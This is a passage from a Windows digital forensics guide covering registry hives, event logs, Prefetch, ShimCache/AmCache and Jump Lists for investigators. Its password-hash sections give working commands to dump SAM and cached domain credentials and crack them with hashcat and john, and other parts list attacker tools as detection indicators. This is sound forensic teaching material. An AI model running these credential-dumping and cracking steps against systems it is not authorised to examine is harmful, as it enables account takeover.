1. **Verify file integrity:** Test if carved file opens properly in appropriate application.
    
2. **Check file size reasonableness:** 100GB JPEG is likely false positive.
    
3. **Examine hex dump manually:**
    

```bash
xxd carved_file.bin | head -20
```

Verify magic bytes are followed by valid structure, not garbage.

4. **Cross-reference with protocols:** If carved from HTTP, verify Content-Type matches file type.

**Anti-Forensic Technique Detection**

Adversaries may fragment, encrypt, or obfuscate data to prevent carving:

**Detection indicators:**

- High entropy in payloads (encryption/compression)
- Custom protocols without standard signatures
- Excessive fragmentation
- Timing anomalies (throttling to avoid detection)

Even when data cannot be recovered, document anti-forensic technique presence as evidence of sophistication.

---

**Related Critical Topics:** Memory Forensics (Network Connection Analysis), Log Correlation (Network and System Logs), Intrusion Detection Systems (Alert Analysis), Threat Intelligence Integration (IOC Matching)

---

# Windows Forensics

## Registry Hive Analysis

The Windows Registry stores system configuration, user settings, and forensic artifacts across multiple binary hive files. Registry analysis reveals user activity, installed software, USB devices, network connections, and persistence mechanisms.

### Registry Structure

**Hive locations:**

```
C:\Windows\System32\config\
├── SAM          - Security Account Manager (user accounts, password hashes)
├── SECURITY     - Security policies, cached domain credentials
├── SOFTWARE     - System-wide application settings
├── SYSTEM       - Hardware configuration, services, drivers
└── DEFAULT      - Default user profile template

C:\Users\<username>\
├── NTUSER.DAT   - User-specific settings, preferences
└── AppData\Local\Microsoft\Windows\
    └── UsrClass.dat - User-specific COM/ShellBag data
```

**Transaction logs:**

- `.LOG`, `.LOG1`, `.LOG2`: Uncommitted registry changes
- `.sav`: Backup copies created during Windows setup

### Extracting Registry Hives

**From live system (requires admin):**

```bash
# Using reg save (Windows)
reg save HKLM\SAM sam.hive
reg save HKLM\SECURITY security.hive
reg save HKLM\SOFTWARE software.hive
reg save HKLM\SYSTEM system.hive
reg save HKU\.DEFAULT default.hive
```

**From disk image:**

```bash
# Mount NTFS partition
mount -o ro,loop,offset=<offset> image.raw /mnt/win

# Copy hives
cp /mnt/win/Windows/System32/config/{SAM,SECURITY,SOFTWARE,SYSTEM,DEFAULT} ./hives/
cp /mnt/win/Users/*/NTUSER.DAT ./hives/
cp /mnt/win/Users/*/AppData/Local/Microsoft/Windows/UsrClass.dat ./hives/
```

### Registry Analysis Tools

**RegRipper:**

```bash
# Installation
git clone https://github.com/keydet89/RegRipper3.0.git
cd RegRipper3.0

# Run specific plugin
./rip.pl -r /path/to/SYSTEM -p compname

# Run all plugins for hive type
./rip.pl -r /path/to/NTUSER.DAT -a

# Generate full report
./rip.pl -r /path/to/SOFTWARE -f software > software_report.txt
```

**Common RegRipper plugins:**

- `compname` - Computer name
- `timezone` - Time zone settings
- `userassist` - Program execution tracking
- `recentdocs` - Recently opened documents
- `typedurls` - Internet Explorer typed URLs
- `usbstor` - USB device history
- `network` - Network adapter configuration
- `services` - Installed services
- `run` - Autorun entries

**Registry Explorer (Eric Zimmerman):**

```bash
# Installation
wget https://f001.backblazeb2.com/file/EricZimmermanTools/RegistryExplorer.zip
unzip RegistryExplorer.zip

# GUI tool - launch on Windows or via Wine
wine RegistryExplorer.exe
```

**Python registry tools:**

```bash
# Using python-registry
pip3 install python-registry

# Example script to read registry keys
python3 << 'EOF'
from Registry import Registry

reg = Registry.Registry("NTUSER.DAT")
key = reg.open("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs")

for value in key.values():
    print(f"{value.name()}: {value.value()}")
EOF
```

### Critical Forensic Keys

**System identification (SYSTEM hive):**

```
SYSTEM\ControlSet001\Control\ComputerName\ComputerName
└── ComputerName: <hostname>

SYSTEM\ControlSet001\Control\TimeZoneInformation
├── TimeZoneKeyName: Time zone
└── Bias: UTC offset in minutes
```

**Operating system details (SOFTWARE hive):**

```
SOFTWARE\Microsoft\Windows NT\CurrentVersion
├── ProductName: Windows edition
├── CurrentVersion: Version number
├── CurrentBuild: Build number
├── InstallDate: Unix timestamp of installation
└── RegisteredOwner: Registered user name
```

**User account information (SAM hive):**

```
SAM\Domains\Account\Users\<RID>
├── F: Binary structure with last login, password change dates
└── V: Binary structure with username, full name, comment

# Requires SYSTEM hive to decrypt
```

**Network configuration (SYSTEM hive):**

```
SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{GUID}
├── DhcpIPAddress: Current IP address
├── DhcpSubnetMask: Subnet mask
├── DhcpDefaultGateway: Default gateway
├── DhcpNameServer: DNS servers
└── DhcpDomain: Domain name

SYSTEM\ControlSet001\Services\Tcpip\Parameters
└── Hostname: System hostname
```

**USB device history (SYSTEM hive):**

```
SYSTEM\ControlSet001\Enum\USBSTOR
└── <VendorID>&Prod_<ProductID>\<SerialNumber>
    ├── FriendlyName: Device description
    └── ParentIdPrefix: Instance ID for correlation

SYSTEM\ControlSet001\Enum\USB\<VID_PID>\<SerialNumber>
└── First connection timestamp (key LastWriteTime)
```

**Mounted devices (SYSTEM hive):**

```
SYSTEM\MountedDevices
├── \DosDevices\C:: Volume GUID
├── \DosDevices\D:: Volume GUID
└── \??\Volume{GUID}: Binary data linking device to mount point
```

**Autorun locations (NTUSER.DAT, SOFTWARE):**

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run

# Each value name = program description, value data = executable path
```

**UserAssist (NTUSER.DAT):**

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count

# Values are ROT13 encoded
# Structure: 72-byte data blob containing:
# - Last execution timestamp (FILETIME)
# - Execution count
# - Focus count
# - Focus time
```

**Decoding UserAssist:**

```python
import struct
from Registry import Registry

def rot13(s):
    return ''.join([chr(ord(c) + 13) if 'a' <= c <= 'm' or 'A' <= c <= 'M' 
                    else chr(ord(c) - 13) if 'n' <= c <= 'z' or 'N' <= c <= 'Z' 
                    else c for c in s])

reg = Registry.Registry("NTUSER.DAT")
key = reg.open("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{GUID}\\Count")

for value in key.values():
    name = rot13(value.name())
    data = value.value()
    
    if len(data) >= 72:
        exec_count = struct.unpack('<I', data[4:8])[0]
        timestamp = struct.unpack('<Q', data[60:68])[0]
        print(f"{name}: Count={exec_count}, Time={timestamp}")
```

**RecentDocs (NTUSER.DAT):**

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

# Subkeys for file extensions (.txt, .pdf, etc.)
# Values are MRUList and numbered entries
# Binary format contains filename and link date
```

**TypedPaths/TypedURLs (NTUSER.DAT):**

```
# File Explorer typed paths
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths

# Internet Explorer typed URLs
NTUSER.DAT\Software\Microsoft\Internet Explorer\TypedURLs
```

**ShellBags (NTUSER.DAT, UsrClass.dat):**

```
NTUSER.DAT\Software\Microsoft\Windows\Shell\BagMRU
NTUSER.DAT\Software\Microsoft\Windows\Shell\Bags

UsrClass.dat\Local Settings\Software\Microsoft\Windows\Shell\BagMRU
UsrClass.dat\Local Settings\Software\Microsoft\Windows\Shell\Bags

# Stores folder view settings and access timestamps
```

**Analyzing ShellBags:**

```bash
# Using ShellBagsExplorer (Eric Zimmerman)
wget https://f001.backblazeb2.com/file/EricZimmermanTools/ShellBagsExplorer.zip
unzip ShellBagsExplorer.zip

# GUI tool for ShellBag timeline analysis
wine ShellBagsExplorer.exe
```

**Wireless networks (SOFTWARE hive):**

```
SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\{GUID}
├── ProfileName: Network SSID
├── Description: Network description
├── DateCreated: First connection (hex timestamp)
└── DateLastConnected: Last connection (hex timestamp)

SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged
└── Contains MAC addresses of access points
```

**Installed software (SOFTWARE hive):**

```
SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\<GUID or AppName>
├── DisplayName: Application name
├── DisplayVersion: Version number
├── Publisher: Software vendor
├── InstallDate: Installation date (YYYYMMDD)
└── UninstallString: Uninstall command

# For 32-bit apps on 64-bit Windows:
SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\
```

### Password Hash Extraction

**Using samdump2:**

```bash
apt-get install samdump2

# Extract password hashes
samdump2 SAM SYSTEM > hashes.txt

# Output format: username:RID:LM_hash:NTLM_hash:::
```

**Using secretsdump.py (Impacket):**

```bash
pip3 install impacket

# Extract hashes from registry hives
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# Outputs:
# - Local user hashes
# - Cached domain credentials
# - LSA secrets
```

**Hash format:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
├── Username
├── RID (Relative ID)
├── LM hash (deprecated, often empty)
└── NTLM hash
```

**Cracking NTLM hashes:**

```bash
# Using hashcat
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Using john
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Cached Domain Credentials

**Extracting cached credentials:**

```bash
# Using secretsdump.py
secretsdump.py -security SECURITY -system SYSTEM LOCAL | grep "NL$"

# Output: Domain Cached Credentials 2 (DCC2/MSCACHE2)
# Format: $DCC2$10240#username#hash
```

**Cracking DCC2:**

```bash
# Hashcat mode 2100
hashcat -m 2100 -a 0 cached_creds.txt wordlist.txt
```

## Windows Event Logs (EVTX)

Windows Event Logs record system events, security auditing, application activity, and user actions in binary EVTX format.

### Event Log Locations

**Windows Vista/7/8/10/11:**

```
C:\Windows\System32\winevt\Logs\
├── Application.evtx       - Application events
├── Security.evtx          - Security audit events
├── System.evtx            - System events
├── Setup.evtx             - Installation events
├── Microsoft-Windows-*.evtx - Specific component logs
└── Forwarded Events.evtx  - Centralized log collection
```

**Key log files:**

- `Security.evtx` - Logon/logoff, privilege use, object access
- `System.evtx` - Service start/stop, driver loading, system time changes
- `Application.evtx` - Application crashes and events
- `Microsoft-Windows-PowerShell/Operational.evtx` - PowerShell script execution
- `Microsoft-Windows-TaskScheduler/Operational.evtx` - Scheduled task activity
- `Microsoft-Windows-TerminalServices-*.evtx` - RDP connections

### Extracting Event Logs

**From mounted image:**

```bash
# Copy all logs
cp /mnt/win/Windows/System32/winevt/Logs/*.evtx ./logs/

# Preserve timestamps
cp -p /mnt/win/Windows/System32/winevt/Logs/*.evtx ./logs/
```

### Parsing EVTX Files

**Using python-evtx:**

```bash
pip3 install python-evtx

# Convert to XML
evtx_dump.py Security.evtx > security.xml

# Convert to JSON
evtx_dump.py --json Security.evtx > security.json
```

**Using EvtxECmd (Eric Zimmerman):**

```bash
wget https://f001.backblazeb2.com/file/EricZimmermanTools/EvtxECmd.zip
unzip EvtxECmd.zip

# Parse single file to CSV
./EvtxECmd -f Security.evtx --csv ./output --csvf security.csv

# Parse directory of logs
./EvtxECmd -d ./logs/ --csv ./output --csvf all_events.csv
```

**Using LogParser (Windows):**

```bash
# Query specific event IDs
LogParser.exe -i:EVT "SELECT * FROM Security.evtx WHERE EventID=4624" -o:CSV

# Filter by time range
LogParser.exe "SELECT * INTO output.csv FROM Security.evtx WHERE TimeGenerated > '2024-01-01'"
```

### Critical Security Event IDs

**Authentication events:**

```
4624 - Successful logon
├── Logon Type 2: Interactive (console)
├── Logon Type 3: Network (SMB, file shares)
├── Logon Type 4: Batch (scheduled tasks)
├── Logon Type 5: Service
├── Logon Type 7: Unlock
├── Logon Type 8: NetworkCleartext (IIS basic auth)
├── Logon Type 9: NewCredentials (RunAs)
├── Logon Type 10: RemoteInteractive (RDP)
└── Logon Type 11: CachedInteractive (cached domain creds)

4625 - Failed logon attempt
├── Sub Status 0xC0000064: User does not exist
├── Sub Status 0xC000006A: Correct username, wrong password
├── Sub Status 0xC0000234: User account locked
├── Sub Status 0xC0000072: Account disabled
└── Sub Status 0xC0000193: Account expired

4634 - Logoff
4647 - User initiated logoff
4648 - Logon using explicit credentials (RunAs)
4672 - Special privileges assigned (admin logon)
4720 - User account created
4722 - User account enabled
4723 - User changed their password
4724 - Administrator reset password
4725 - User account disabled
4726 - User account deleted
4738 - User account changed
4740 - User account locked out
4767 - User account unlocked
```

**Object access events (requires audit policy):**

```
4656 - Handle to object requested
4663 - Attempt to access object
4660 - Object deleted
4670 - Permissions on object changed
```

**System events:**

```
4688 - Process created (includes command line if audit policy enabled)
4689 - Process exited
1074 - System shutdown/restart initiated
6005 - Event Log service started (boot time)
6006 - Event Log service stopped
6009 - System boot (in System.evtx)
7034 - Service crashed
7035 - Service start/stop
7036 - Service state change
7040 - Service startup type changed
7045 - Service installed
```

**PowerShell events:**

```
Microsoft-Windows-PowerShell/Operational:
4103 - Module logging (command execution)
4104 - Script block logging (script content)

Windows PowerShell.evtx:
400 - Engine started
403 - Engine stopped
600 - Provider started
800 - Pipeline execution details
```

**RDP events:**

```
Microsoft-Windows-TerminalServices-LocalSessionManager/Operational:
21 - Logon success
22 - Shell start (desktop ready)
23 - Logoff
24 - Session disconnected
25 - Session reconnected

Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational:
1149 - RDP authentication success
261 - Network connection received
```

**Task Scheduler events:**

```
Microsoft-Windows-TaskScheduler/Operational:
106 - Scheduled task created
129 - Task started
141 - Task deleted
200 - Task executed
201 - Task completed
```

### Querying Event Logs

**PowerShell on Windows:**

```powershell
# Filter by Event ID
Get-WinEvent -Path .\Security.evtx -FilterXPath "*[System[EventID=4624]]"

# Filter by time range
$Start = (Get-Date "2024-01-01")
$End = (Get-Date "2024-12-31")
Get-WinEvent -Path .\Security.evtx | Where-Object {$_.TimeCreated -ge $Start -and $_.TimeCreated -le $End}

# Export to CSV
Get-WinEvent -Path .\Security.evtx | Select-Object TimeCreated,Id,Message | Export-Csv events.csv
```

**grep on XML-converted logs:**

```bash
# Convert to XML first
evtx_dump.py Security.evtx > security.xml

# Search for specific patterns
grep -i "EventID>4624" security.xml
grep -i "administrator" security.xml | grep "4624"

# Extract specific fields
xmllint --xpath "//Event[System/EventID=4624]" security.xml
```

**Timeline analysis:**

```bash
# Using EvtxECmd output
cat all_events.csv | awk -F',' '{print $1, $4, $5}' | sort

# Filter failed logons
grep "4625" security.csv | cut -d',' -f1,8,12
```

### Detecting Common Attacks

**Brute force detection:**

```bash
# Multiple failed logons (Event 4625)
grep "4625" Security.csv | awk -F',' '{print $8}' | sort | uniq -c | sort -rn

# Threshold: >5 failures in short time period
```

**Pass-the-Hash detection:**

```bash
# Logon Type 3 with NTLM auth and no logon process
# Event 4624 with:
# - LogonType: 3
# - AuthenticationPackage: NTLM
# - LogonProcess: NtLmSsp
```

**Lateral movement:**

```bash
# Service installation (Event 7045)
grep "7045" System.csv

# Task creation (Event 4698)
grep "4698" Security.csv

# WMI activity (Event 5857-5861)
grep "585[7-9]\|586[0-1]" Security.csv
```

**Privilege escalation:**

```bash
# Special privileges (Event 4672) for non-admin accounts
grep "4672" Security.csv | grep -v "Administrator\|SYSTEM"

# Token manipulation (Event 4673)
grep "4673" Security.csv
```

### Event Log Clearing Detection

**Event ID 1102/1105:**

```
Security.evtx:
1102 - Audit log cleared

System.evtx:
104 - Log cleared

# [Inference] Log clearing indicates anti-forensic activity
# Check for gaps in Event Record IDs to detect selective deletion
```

**Detecting gaps:**

```bash
# Extract Event Record IDs
evtx_dump.py Security.evtx | grep "EventRecordID" | cut -d'>' -f2 | cut -d'<' -f1 | sort -n > record_ids.txt

# Find gaps
awk '{if (NR>1 && $1 != prev+1) print "Gap: "prev" to "$1; prev=$1}' record_ids.txt
```

## Prefetch File Analysis

Windows Prefetch optimizes application loading by caching information about executed programs and accessed files.

### Prefetch Overview

**Location:**

```
C:\Windows\Prefetch\
├── <APPNAME>-<HASH>.pf    - Application prefetch files
└── Layout.ini              - Disk layout optimization

# Enabled on Windows 7+, disabled on Server 2008+
```

**Information stored:**

- Executable name and path
- Run count
- Last 8 execution timestamps (Windows 8+)
- Files and directories accessed during first 10 seconds
- Volume information

### Extracting Prefetch Files

**From disk image:**

```bash
# Copy all prefetch files
cp /mnt/win/Windows/Prefetch/*.pf ./prefetch/

# Check if prefetch is enabled
grep -q "EnablePrefetcher" /mnt/win/Windows/System32/config/SYSTEM
# Value 0 = disabled, 1 = applications only, 2 = boot only, 3 = both
```

### Parsing Prefetch Files

**Using PECmd (Eric Zimmerman):**

```bash
wget https://f001.backblazeb2.com/file/EricZimmermanTools/PECmd.zip
unzip PECmd.zip

# Parse single file
./PECmd -f CHROME.EXE-A1B2C3D4.pf

# Parse directory to CSV
./PECmd -d ./prefetch/ --csv ./output --csvf prefetch_analysis.csv

# Outputs:
# - Executable name
# - Hash
# - Run count
# - Last run times
# - Files loaded
# - Directories referenced
# - Volumes
```

**Using prefetch.py:**

```bash
git clone https://github.com/PoorBillionaire/Windows-Prefetch-Parser.git
cd Windows-Prefetch-Parser

python3 prefetch.py -f CHROME.EXE-A1B2C3D4.pf
```

**Manual parsing:**

```bash
# Prefetch header (Windows 10)
xxd -l 84 CHROME.EXE-A1B2C3D4.pf

# Signature: "MAM\x04" or "MAM\x1a" or "MAM\x1e"
# Offset 0x10: File size
# Offset 0x78: Run count
# Offset 0x80-0xC0: Last 8 run times (FILETIME format)
```

### Prefetch Hash Calculation

The 8-character hexadecimal hash in prefetch filenames is calculated from the executable path.

**Hash algorithms:**

- Windows XP-7: Simple hash of path (case-insensitive)
- Windows 8+: SCCA hash algorithm

**Calculating hash (Windows 8+):**

```python
def calculate_prefetch_hash(path):
    path = path.upper().encode('utf-16-le')
    hash_value = 0
    
    for i in range(0, len(path), 2):
        char = int.from_bytes(path[i:i+2], 'little')
        hash_value = ((hash_value * 37) + char) & 0xFFFFFFFF
    
    return f"{hash_value:08X}"

# Example
path = "C:\\WINDOWS\\SYSTEM32\\CMD.EXE"
print(calculate_prefetch_hash(path))
```

### Forensic Analysis

**Execution proof:**

```bash
# Extract all executed programs
./PECmd -d ./prefetch/ --csv ./output --csvf prefetch.csv
awk -F',' '{print $2, $8, $9}' prefetch.csv | sort -k2 -r

# Columns: Executable, RunCount, LastRunTime
```

**Timeline creation:**

```bash
# Sort by last execution time
cat prefetch.csv | awk -F',' '{print $9, $2}' | sort

# Filter specific timeframe
cat prefetch.csv | awk -F',' '{if ($9 > "2024-01-01" && $9 < "2024-12-31") print $9, $2}'
```

**File access patterns:**

```bash
# Files accessed by specific executable
./PECmd -f SUSPICIOUS.EXE-12345678.pf | grep "Filename:"

# Common pattern: malware accessing temp directories, AppData, startup folders
```

**Detecting renamed executables:**

```bash
# Hash mismatch indicates executable moved/renamed
# Original path stored in prefetch file differs from filename
```

**Suspicious indicators:**

- High run count for typically one-time installers
- Executables from unusual locations (C:\Users\Public, temp directories)
- System binaries run from non-system paths
- Known malware filenames (mimikatz.exe, psexec.exe, etc.)

## ShimCache/AmCache

Windows Application Compatibility databases track executed programs for compatibility troubleshooting, providing forensic evidence of program execution.

### ShimCache (AppCompatCache)

**Location:**

```
Registry: SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache
Key: AppCompatCache (binary value)

# Survives across reboots (persisted in registry)
# Does NOT require execution, only interaction (e.g., file browsing)
```

**Information stored:**

- Full file path
- File size
- Last modification time ($Standard_Information)
- Execution flag (Windows XP-Server 2003 only)

**[Inference] ShimCache entries persist until system reboot flushes cache to registry, so entries may represent files accessed before shutdown.**

**Parsing ShimCache:**

```bash
# Using AppCompatCacheParser (Eric Zimmerman)
wget https://f001.backblazeb2.com/file/EricZimmermanTools/AppCompatCacheParser.zip
unzip AppCompatCacheParser.zip

# Parse from registry hive
./AppCompatCacheParser -f SYSTEM --csv ./output --csvf shimcache.csv

# Parse from live system (Windows, requires admin)
./AppCompatCacheParser --csv ./output --csvf shimcache.csv
```

**Output fields:**

- CacheEntryPosition: Order in cache (lower = more recent)
- Path: Full executable path
- LastModified: File modification timestamp
- Executed: Execution flag (XP/2003 only, otherwise "N/A")

**RegRipper plugin:**

```bash
./rip.pl -r SYSTEM -p appcompatcache > shimcache.txt
```

**Python parsing:**

```python
from Registry import Registry
import struct

reg = Registry.Registry("SYSTEM")
key = reg.open("ControlSet001\\Control\\Session Manager\\AppCompatCache")
data = key.value("AppCompatCache").value()

# Format varies by Windows version
# Windows 10 1607+: 52-byte header, variable entry size
# Each entry contains path (unicode null-terminated) + timestamps
```

### AmCache

**Location:**

```
C:\Windows\AppCompat\Programs\Amcache.hve

# Registry hive file (not loaded by default)
# Tracks application installations, executions, drivers, shortcuts
```

**Information stored:**

- Full file path
- SHA1 hash
- File size
- PE header fields (compile time, file version, product name)
- First execution time
- Deletion time (if file removed)

**Key registry paths within Amcache.hve:**

```
Root\File\{Volume GUID}\
└── <FileID>
    ├── 0: Product name
    ├── 1: Company name
    ├── 2: File version number
    ├── 3: Language code
    ├── 5: File version
    ├── 6: File size
    ├── 7: PE header size
    ├── 8: Unknown
    ├── 9: PE header hash
    ├── a: Unknown
    ├── b: Unknown
    ├── c: File description
    ├── d: Unknown
    ├── f: Compile time
    ├── 11: Last modified time (File)
    ├── 12: Created time
    ├── 15: Full path
    ├── 17: Last modified time (PE header)
    └── 101: SHA1 hash

Root\InventoryApplicationFile\
└── Program execution entries (Windows 10+)
```

**Parsing AmCache:**

```bash
# Using AmcacheParser (Eric Zimmerman)
wget https://f001.backblazeb2.com/file/EricZimmermanTools/AmcacheParser.zip
unzip AmcacheParser.zip

# Parse to CSV
./AmcacheParser -f Amcache.hve --csv ./output

# Outputs multiple CSV files:
# - Amcache_UnassociatedFileEntries.csv: All file entries
# - Amcache_AssociatedFileEntries.csv: Linked to programs
# - Amcache_DeviceContainers.csv: Devices
# - Amcache_DriveBinaries.csv: Drivers
# - Amcache_InventoryApplication.csv: Installed applications
# - Amcache_InventoryApplicationFile.csv: Application files (execution evidence)
# - Amcache_ProgramEntries.csv: Program data
# - Amcache_ShortCuts.csv: LNK file tracking
```

**RegRipper:**

```bash
./rip.pl -r Amcache.hve -p amcache > amcache_report.txt
```

**Manual registry analysis:**

```bash
# Using Registry Explorer
wine RegistryExplorer.exe

# Load Amcache.hve
# Navigate to: Root\File\{Volume GUID}\
# Each entry = file tracked by AmCache
```

### Forensic Analysis

**Execution timeline:**

```bash
# Combine ShimCache and AmCache
cat shimcache.csv amcache_inventory.csv | awk -F',' '{print $1, $2}' | sort -k1

# ShimCache: Broader coverage, less detail
# AmCache: Detailed metadata, execution timestamps (Windows 10+)
```

**Malware detection:**

```bash
# Hash lookup against known malware
cat amcache_unassociated.csv | awk -F',' '{print $X}' | while read hash; do
    curl -s "https://www.virustotal.com/api/v3/files/$hash" -H "x-apikey: YOUR_KEY"
done
```

**Suspicious patterns:**

- Executables from temp directories (C:\Users*\AppData\Local\Temp)
- Unusual compile times (future dates, very old dates for "new" files)
- Missing product/company name (common in malware)
- Short-lived executables (creation and deletion within minutes)
- System32 executables run from non-system paths

**Deleted file recovery:**

```bash
# AmCache retains entries for deleted files
# Filter for files with deletion timestamps
awk -F',' '{if ($DeletionTimeColumn != "") print $0}' amcache.csv
```

## Jump Lists and Recent Files

Jump Lists provide quick access to recently/frequently used files and applications, creating a timeline of user activity.

### Jump List Locations

**Automatic Destinations:**

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\
└── <AppID>.automaticDestinations-ms

# Application-specific, automatically generated
# Contains recent files opened by application
```

**Custom Destinations:**

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\
└── <AppID>.customDestinations-ms

# Application-specific, manually pinned items
# Items user explicitly pinned to taskbar jump list
```

**Recent folder:**

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Recent\
├── *.lnk          - LNK files for recently accessed documents
└── AutomaticDestinations\
    CustomDestinations\
```

### Application IDs (AppIDs)

Common AppIDs identify which application created the jump list:

```
1b4dd67f29cb1962 - Internet Explorer
5d696d521de238c3 - MS Paint
6bc3d0c01ffe0e4c - Word 2016
7e4dca80246863e3 - Firefox
9839aec31243a928 - Calculator
b91c4d8b96ce3f0b - PowerPoint 2016
c2d349a0e756411b - Notepad++
d65231b8bdfad0bb - Excel 2016
f01b4d95cf55d32a - Windows Explorer
fb3b0dbfee58fac8 - Remote Desktop Connection
```

**Finding AppIDs:**

```bash
# List all jump lists with AppIDs
ls -la /mnt/win/Users/*/AppData/Roaming/Microsoft/Windows/Recent/*Destinations/*.ms

# Identify unknown AppIDs using tools or online databases
# [Unverified] AppID databases are community-maintained, verify findings independently
```

### Parsing Jump Lists

**Using JLECmd (Eric Zimmerman):**

```bash
wget https://f001.backblazeb2.com/file/EricZimmermanTools/JLECmd.zip
unzip JLECmd.zip

# Parse single jump list
./JLECmd -f 1b4dd67f29cb1962.automaticDestinations-ms

# Parse entire directory
./JLECmd -d /path/to/AutomaticDestinations/ --csv ./output --csvf jumplists.csv

# Parse all user jump lists
./JLECmd -d /mnt/win/Users/ --all --csv ./output --csvf all_jumplists.csv
```

**Output includes:**

- Application ID
- File path accessed
- Access timestamps
- File size
- MAC times (Modified, Accessed, Created)
- Target MFT entry/sequence
- Volume information
- Machine ID

**Using jumplist.py:**

```bash
git clone https://github.com/woanware/jumplister.git
cd jumplister

python3 jumplister.py -f 1b4dd67f29cb1962.automaticDestinations-ms -o output.txt
```

### Automatic Destinations Format

Automatic destinations files use OLE Compound File format containing multiple streams:

**Structure:**

- DestList stream: Metadata (access count, timestamps, MRU list)
- Multiple numbered streams: Individual LNK files embedded

**Extracting embedded LNK files:**

```bash
# Using 7zip
7z x 1b4dd67f29cb1962.automaticDestinations-ms -o./extracted/

# Manual extraction with Python
python3 << 'EOF'
import olefile

ole = olefile.OleFileIO('1b4dd67f29cb1962.automaticDestinations-ms')
for stream in ole.listdir():
    if stream[0].isdigit():
        data = ole.openstream(stream).read()
        with open(f"{stream[0]}.lnk", 'wb') as f:
            f.write(data)
EOF
```

**DestList stream parsing:**

```python
import struct

with open('extracted/DestList', 'rb') as f:
    data = f.read()
    
# Header: 32 bytes
version = struct.unpack('<I', data[0:4])[0]
num_entries = struct.unpack('<I', data[4:8])[0]

# Each entry (varies by version, typically 114+ bytes)
offset = 32
for i in range(num_entries):
    entry_size = struct.unpack('<I', data[offset+8:offset+12])[0]
    # Parse timestamps, paths, etc.
    offset += entry_size
```

### Custom Destinations Format

Custom destinations use different structure:

**Format:**

- Header: ABFB marker
- LNK files: Concatenated, separated by footers
- Footer: BABB marker with size information

**Parsing custom destinations:**

```bash
# JLECmd handles both automatic and custom
./JLECmd -f <AppID>.customDestinations-ms

# Manual split by markers
grep -obUaP "\xAB\xFB" file.customDestinations-ms
```

### Recent Folder Analysis

The Recent folder contains LNK shortcuts to recently accessed documents:

**Extracting LNK files:**

```bash
# Copy all LNK files
cp /mnt/win/Users/*/AppData/Roaming/Microsoft/Windows/Recent/*.lnk ./recent/

# Parse with LECmd
./LECmd -d ./recent/ --csv ./output --csvf recent_lnk.csv
```

### Forensic Applications

**User activity timeline:**

```bash
# Extract all access times from jump lists
cat jumplists.csv | awk -F',' '{print $X, $Y}' | sort -k1

# Identify document access patterns
grep -i ".docx\|.xlsx\|.pdf" jumplists.csv | awk -F',' '{print $1, $2}'
```

**Remote file access:**

```bash
# Jump lists preserve network paths
grep "^\\\\\\\\" jumplists.csv  # UNC paths
grep "Z:\|Y:\|X:" jumplists.csv  # Mapped drives

# Reveals file shares accessed by user
```

**Deleted file evidence:**

```bash
# Jump lists retain entries for deleted files
# File path remains even if target deleted
# Cross-reference with MFT entries to confirm deletion
```

**Application usage:**

```bash
# Identify applications user accessed
ls AutomaticDestinations/*.ms | while read file; do
    appid=$(basename "$file" .automaticDestinations-ms)
    echo "AppID: $appid"
    ./JLECmd -f "$file" --csv . --csvf temp.csv
    echo "Recent files:"
    cat temp.csv | awk -F',' '{print $X}' | head -5
    echo ""
done
```

**Suspicious indicators:**

- Jump lists for hacking tools (Mimikatz, PSTools, PuTTY)
- Access to sensitive directories (SAM, SYSTEM registry hives)
- Remote file access to suspicious IPs
- Access patterns suggesting data exfiltration (many files in short time)
- Jump lists for applications not officially installed

## Windows Search Index

Windows Search maintains an index database (ESE database) to accelerate file searches, containing metadata and content snippets.

### Search Index Location

**Database path:**

```
C:\ProgramData\Microsoft\Search\Data\Applications\Windows\
├── Windows.edb          - Main ESE database
├── Windows.edb.log      - Transaction logs
└── tmp.edb              - Temporary database

# Also check:
C:\Users\<username>\AppData\Local\Microsoft\Windows\Search\
```

### ESE Database Structure

Windows.edb is an Extensible Storage Engine (ESE) database containing multiple tables:

**Key tables:**

- SystemIndex_0A: Main index table (file paths, properties)
- SystemIndex_Gthr: Gatherer table (indexing queue)
- SystemIndex_GthrAppLog: Application log

### Extracting Search Index

**Using ESEDatabaseView:**

```bash
# Download NirSoft ESEDatabaseView
wget https://www.nirsoft.net/utils/esedatabaseview-x64.zip
unzip esedatabaseview-x64.zip

# GUI tool - works with Wine
wine ESEDatabaseView.exe

# Load Windows.edb
# Export table: File > Export Selected Items
```

**Using libesedb:**

```bash
apt-get install libesedb-utils

# View database info
esedbinfo Windows.edb

# List tables
esedbexport -l Windows.edb

# Export specific table
esedbexport -t SystemIndex_0A Windows.edb -o ./output/

# Export all tables
esedbexport Windows.edb -o ./output/
```

**Using python-libesedb:**

```bash
pip3 install pyesedb

# Example extraction
python3 << 'EOF'
import pyesedb

db = pyesedb.open("Windows.edb")
table = db.get_table_by_name("SystemIndex_0A")

for record in table.records:
    # Common columns (indices vary by Windows version)
